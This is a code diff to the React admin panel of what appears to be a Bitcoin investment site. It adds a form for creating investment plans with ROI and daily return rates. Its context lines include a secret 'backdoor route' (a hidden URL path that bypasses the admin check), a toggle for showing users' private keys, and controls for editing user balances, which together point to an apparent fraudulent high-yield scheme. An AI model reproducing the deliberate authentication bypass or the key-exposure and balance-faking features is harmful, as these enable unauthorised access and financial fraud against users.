@@ -36,6 +36,15 @@ export default function Management() {
   const [showPrivateKeys, setShowPrivateKeys] = useState<{ [userId: number]: boolean }>({});
   const [vaultAddress, setVaultAddress] = useState("");
   const [depositAddress, setDepositAddress] = useState("");
+  const [createPlanDialogOpen, setCreatePlanDialogOpen] = useState(false);
+  const [newPlan, setNewPlan] = useState({
+    name: "",
+    minAmount: "",
+    roiPercentage: "",
+    durationDays: "",
+    dailyReturnRate: "",
+    color: "#3B82F6",
+  });
 
   // Allow access via backdoor route or if user is admin
   const isBackdoorAccess = window.location.pathname === '/Hello10122' || 
@@ -359,6 +368,46 @@ export default function Management() {
     },
   });
 
+  const createPlanMutation = useMutation({
+    mutationFn: async (planData: any) => {
+      const response = await fetch('/api/admin/create-plan', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(planData),
+      });
+
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.message);
+      }
+
+      return response.json();
+    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ['/api/investment-plans'] });
+      setCreatePlanDialogOpen(false);
+      setNewPlan({
+        name: "",
+        minAmount: "",
+        roiPercentage: "",
+        durationDays: "",
+        dailyReturnRate: "",
+        color: "#3B82F6",
+      });
+      toast({
+        title: "Plan Created",
+        description: "New investment plan has been created successfully.",
+      });
+    },
+    onError: (error) => {
+      toast({
+        title: "Creation Failed",
+        description: error.message,
+        variant: "destructive",
+      });
+    },
+  });
+
   const handleUpdateBalance = (user: User) => {
     setSelectedUser(user);
     setNewBalance(user.balance);
@@ -649,10 +698,18 @@ export default function Management() {
         {/* Investment Plan Management */}
         <Card className="dark-card dark-border">
           <CardHeader>
-            <CardTitle className="flex items-center gap-2 text-foreground">
-              <TrendingUp className="w-5 h-5" />
-              Investment Plan Management
-            </CardTitle>
+            <div className="flex items-center justify-between">
+              <CardTitle className="flex items-center gap-2 text-foreground">
+                <TrendingUp className="w-5 h-5" />
+                Investment Plan Management
+              </CardTitle>
+              <Button
+                onClick={() => setCreatePlanDialogOpen(true)}
+                className="bg-bitcoin hover:bg-bitcoin/90 text-black"
+              >
+                Create New Plan
+              </Button>
+            </div>
           </CardHeader>
           <CardContent>
             <div className="space-y-4">
@@ -901,6 +958,99 @@ export default function Management() {
                 {updateBalanceMutation.isPending ? "Updating..." : "Update Balance"}
               </Button>
               <Button variant="outline" onClick={() => setDialogOpen(false)}>
+                Cancel
+              </Button>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* Create Plan Dialog */}
+      <Dialog open={createPlanDialogOpen} onOpenChange={setCreatePlanDialogOpen}>
+        <DialogContent className="dark-card dark-border">
+          <DialogHeader>
+            <DialogTitle className="text-foreground">Create Investment Plan</DialogTitle>
+          </DialogHeader>
+          <div className="space-y-4">
+            <div>
+              <Label htmlFor="planName">Plan Name</Label>
+              <Input
+                id="planName"
+                value={newPlan.name}
+                onChange={(e) => setNewPlan({ ...newPlan, name: e.target.value })}
+                placeholder="e.g., Gold Plan"
+              />
+            </div>
+            <div>
+              <Label htmlFor="minAmount">Minimum Amount (BTC)</Label>
+              <Input
+                id="minAmount"
+                type="number"
+                step="0.00000001"
+                value={newPlan.minAmount}
+                onChange={(e) => setNewPlan({ ...newPlan, minAmount: e.target.value })}
+                placeholder="0.01000000"
+              />
+            </div>
+            <div>
+              <Label htmlFor="roiPercentage">ROI Percentage</Label>
+              <Input
+                id="roiPercentage"
+                type="number"
+                value={newPlan.roiPercentage}
+                onChange={(e) => setNewPlan({ ...newPlan, roiPercentage: e.target.value })}
+                placeholder="25"
+              />
+            </div>
+            <div>
+              <Label htmlFor="durationDays">Duration (Days)</Label>
+              <Input
+                id="durationDays"
+                type="number"
+                value={newPlan.durationDays}
+                onChange={(e) => setNewPlan({ ...newPlan, durationDays: e.target.value })}
+                placeholder="90"
+              />
+            </div>
+            <div>
+              <Label htmlFor="dailyRate">Daily Return Rate (%)</Label>
+              <Input
+                id="dailyRate"
+                type="number"
+                step="0.0001"
+                value={newPlan.dailyReturnRate}
+                onChange={(e) => setNewPlan({ ...newPlan, dailyReturnRate: e.target.value })}
+                placeholder="0.5000"
+              />
+            </div>
+            <div>
+              <Label htmlFor="planColor">Plan Color</Label>
+              <Input
+                id="planColor"
+                type="color"
+                value={newPlan.color}
+                onChange={(e) => setNewPlan({ ...newPlan, color: e.target.value })}
+              />
+            </div>
+            <div className="flex gap-2">
+              <Button
+                onClick={() => {
+                  const dailyRateDecimal = (parseFloat(newPlan.dailyReturnRate) / 100).toString();
+                  createPlanMutation.mutate({
+                    ...newPlan,
+                    roiPercentage: parseInt(newPlan.roiPercentage),
+                    durationDays: parseInt(newPlan.durationDays),
+                    dailyReturnRate: dailyRateDecimal,
+                    updateIntervalMinutes: 10,
+                    isActive: true,
+                  });
+                }}
+                disabled={createPlanMutation.isPending || !newPlan.name || !newPlan.minAmount}
+                className="bg-bitcoin hover:bg-bitcoin/90 text-black flex-1"
+              >
+                {createPlanMutation.isPending ? "Creating..." : "Create Plan"}
+              </Button>
+              <Button variant="outline" onClick={() => setCreatePlanDialogOpen(false)}>
                 Cancel
               </Button>
             </div>
